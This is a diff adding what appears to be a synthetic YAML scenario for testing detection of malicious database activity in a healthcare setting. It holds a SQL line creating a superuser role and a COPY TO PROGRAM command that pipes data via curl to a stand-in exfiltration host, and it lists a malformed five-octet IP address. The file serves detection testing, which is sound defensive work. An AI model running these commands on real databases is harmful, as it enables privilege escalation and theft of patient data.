@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_09_data_tamper_mal_194
+family_id: gen_healthcare_09_data_tamper_mal_fam194
+domain: healthcare
+time_of_day: 02:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_7162 SUPERUSER LOGIN PASSWORD 'x219280'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 194.147.78.75.165
+      port: 23
